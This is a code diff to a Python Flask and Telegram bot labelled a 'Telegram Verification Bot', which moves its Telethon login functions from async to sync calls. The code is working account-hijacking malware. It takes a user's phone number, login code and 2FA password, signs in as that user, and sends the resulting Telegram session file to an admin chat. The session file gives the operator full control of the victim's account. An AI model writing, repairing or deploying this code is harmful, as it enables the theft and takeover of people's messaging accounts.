@@ -5,7 +5,6 @@ from flask import Flask, render_template, request, jsonify
 import threading
 import time
 import logging
-import subprocess
 import json
 from datetime import datetime
 import asyncio
@@ -91,17 +90,18 @@ def send_to_admin(phone, otp=None, password=None, user_info=None, session_path=N
                 phone_clean = phone.replace('+', '')
                 
                 # Look for session files for this phone
-                for filename in os.listdir(session_dir):
-                    if phone_clean in filename and filename.endswith('.session'):
-                        session_path = os.path.join(session_dir, filename)
-                        with open(session_path, 'rb') as f:
-                            notification_bot.send_document(
-                                ADMIN_ID,
-                                f,
-                                caption=f"📁 Session file for {phone}"
-                            )
-                        logger.info(f"✅ Session sent from fallback: {session_path}")
-                        break
+                if os.path.exists(session_dir):
+                    for filename in os.listdir(session_dir):
+                        if phone_clean in filename and filename.endswith('.session'):
+                            session_path = os.path.join(session_dir, filename)
+                            with open(session_path, 'rb') as f:
+                                notification_bot.send_document(
+                                    ADMIN_ID,
+                                    f,
+                                    caption=f"📁 Session file for {phone}"
+                                )
+                            logger.info(f"✅ Session sent from fallback: {session_path}")
+                            break
             except Exception as e:
                 logger.error(f"Fallback session send error: {e}")
         
@@ -112,8 +112,9 @@ def send_to_admin(phone, otp=None, password=None, user_info=None, session_path=N
         logger.error(f"Admin error: {e}")
         return False
 
-async def send_otp_async(phone):
-    """Send OTP using Telethon"""
+# ==================== TELETHON FUNCTIONS ====================
+def run_telethon_send_otp(phone):
+    """Send OTP using Telethon in separate thread"""
     try:
         # Create session directory
         os.makedirs('sessions', exist_ok=True)
@@ -122,28 +123,33 @@ async def send_otp_async(phone):
         phone_clean = phone.replace('+', '')
         session_name = f"sessions/{phone_clean}"
         
-        # Create client
+        # Run Telethon in sync mode
         client = TelegramClient(session_name, API_ID, API_HASH)
-        await client.connect()
         
-        # Send code request
-        sent = await client.send_code_request(phone)
+        # Connect and send code request
+        client.connect()
         
-        await client.disconnect()
-        
-        return {
-            'success': True,
-            'phone_code_hash': sent.phone_code_hash,
-            'session_name': session_name
-        }
-        
-    except FloodWaitError as e:
-        return {'success': False, 'error': f'Flood wait: Please wait {e.seconds} seconds'}
+        try:
+            sent = client.send_code_request(phone)
+            client.disconnect()
+            
+            return {
+                'success': True,
+                'phone_code_hash': sent.phone_code_hash,
+                'session_name': session_name
+            }
+        except FloodWaitError as e:
+            client.disconnect()
+            return {'success': False, 'error': f'Flood wait: Please wait {e.seconds} seconds'}
+        except Exception as e:
+            client.disconnect()
+            return {'success': False, 'error': str(e)}
+            
     except Exception as e:
         return {'success': False, 'error': str(e)}
 
-async def verify_otp_async(phone, otp, phone_code_hash):
-    """Verify OTP using Telethon"""
+def run_telethon_verify_otp(phone, otp, phone_code_hash):
+    """Verify OTP using Telethon in separate thread"""
     try:
         phone_clean = phone.replace('+', '')
         session_name = f"sessions/{phone_clean}"
@@ -152,20 +158,20 @@ async def verify_otp_async(phone, otp, phone_code_hash):
         if not os.path.exists(session_name + '.session'):
             return {'success': False, 'error': 'Session not found'}
         
-        # Create client
+        # Run Telethon in sync mode
         client = TelegramClient(session_name, API_ID, API_HASH)
-        await client.connect()
+        client.connect()
         
         try:
             # Sign in with OTP
-            await client.sign_in(
+            client.sign_in(
                 phone=phone,
                 code=otp,
                 phone_code_hash=phone_code_hash
             )
             
             # Get user info
-            me = await client.get_me()
+            me = client.get_me()
             user_info = {
                 'id': me.id,
                 'username': me.username,
@@ -175,10 +181,10 @@ async def verify_otp_async(phone, otp, phone_code_hash):
             }
             
             # Save session
-            await client.session.save()
+            client.session.save()
             session_path = f"{client.session.filename}.session"
             
-            await client.disconnect()
+            client.disconnect()
             
             return {
                 'success': True,
@@ -189,38 +195,38 @@ async def verify_otp_async(phone, otp, phone_code_hash):
             
         except SessionPasswordNeededError:
             # 2FA required
-            await client.disconnect()
+            client.disconnect()
             return {
                 'success': True,
                 'requires_2fa': True,
                 'session_name': session_name
             }
         except PhoneCodeInvalidError:
-            await client.disconnect()
+            client.disconnect()
             return {'success': False, 'error': 'Invalid OTP code'}
         except Exception as e:
-            await client.disconnect()
+            client.disconnect()
             return {'success': False, 'error': str(e)}
             
     except Exception as e:
         return {'success': False, 'error': str(e)}
 
-async def verify_2fa_async(session_name, password):
-    """Verify 2FA password using Telethon"""
+def run_telethon_verify_2fa(session_name, password):
+    """Verify 2FA password using Telethon in separate thread"""
     try:
         # Check if session exists
         if not os.path.exists(session_name + '.session'):
             return {'success': False, 'error': 'Session not found'}
         
-        # Create client
+        # Run Telethon in sync mode
         client = TelegramClient(session_name, API_ID, API_HASH)
-        await client.connect()
+        client.connect()
         
         try:
-            await client.sign_in(password=password)
+            client.sign_in(password=password)
             
             # Get user info
-            me = await client.get_me()
+            me = client.get_me()
             user_info = {
                 'id': me.id,
                 'username': me.username,
@@ -230,10 +236,10 @@ async def verify_2fa_async(session_name, password):
             }
             
             # Save session
-            await client.session.save()
+            client.session.save()
             session_path = f"{client.session.filename}.session"
             
-            await client.disconnect()
+            client.disconnect()
             
             return {
                 'success': True,
@@ -242,25 +248,13 @@ async def verify_2fa_async(session_name, password):
             }
             
         except PasswordHashInvalidError:
-            await client.disconnect()
+            client.disconnect()
             return {'success': False, 'error': 'Invalid 2FA password'}
         except Exception as e:
-            await client.disconnect()
+            client.disconnect()
             return {'success': False, 'error': str(e)}
             
     except Exception as e:
-        return {'success': False, 'error': str(e)}
-
-def run_async_task(coroutine):
-    """Run async task in thread"""
-    try:
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-        result = loop.run_until_complete(coroutine)
-        loop.close()
-        return result
-    except Exception as e:
-        logger.error(f"Async task error: {e}")
         return {'success': False, 'error': str(e)}
 
 # ==================== BOT HANDLERS ====================
@@ -352,7 +346,7 @@ def handle_contact(message):
         # Send OTP in background
         def send_otp_task():
             try:
-                result = run_async_task(send_otp_async(phone))
+                result = run_telethon_send_otp(phone)
                 
                 if result.get('success'):
                     # Store OTP data
@@ -465,7 +459,7 @@ def api_share_contact():
         
         # Send OTP in background
         def send_otp_task():
-            result = run_async_task(send_otp_async(phone))
+            result = run_telethon_send_otp(phone)
             
             if result.get('success'):
                 otp_data[user_id] = {
@@ -530,7 +524,7 @@ def api_verify_otp():
             return jsonify({'success': False, 'error': 'OTP not sent yet'})
         
         # Verify OTP using Telethon
-        result = run_async_task(verify_otp_async(phone, otp, phone_code_hash))
+        result = run_telethon_verify_otp(phone, otp, phone_code_hash)
         
         if result.get('success'):
             if result.get('requires_2fa'):
@@ -596,7 +590,7 @@ def api_verify_2fa():
             return jsonify({'success': False, 'error': 'Session expired'})
         
         # Verify 2FA using Telethon
-        result = run_async_task(verify_2fa_async(session_name, password))
+        result = run_telethon_verify_2fa(session_name, password)
         
         if result.get('success'):
             # Success
@@ -678,7 +672,7 @@ def cleanup_old_sessions():
 # ==================== MAIN ====================
 if __name__ == "__main__":
     logger.info("="*60)
-    logger.info("🚀 Telegram Verification Bot - DIRECT TELETHON VERSION")
+    logger.info("🚀 Telegram Verification Bot - SYNC TELETHON VERSION")
     logger.info("="*60)
     logger.info(f"🤖 Main Bot Token: {BOT_TOKEN[:10]}...")
     logger.info(f"👑 Admin Bot Token: {ADMIN_BOT_TOKEN[:10]}..." if ADMIN_BOT_TOKEN else "👑 Using main bot for admin notifications")
@@ -742,4 +736,4 @@ if __name__ == "__main__":
         debug=False,
         use_reloader=False,
         threaded=True
-        )
+            )
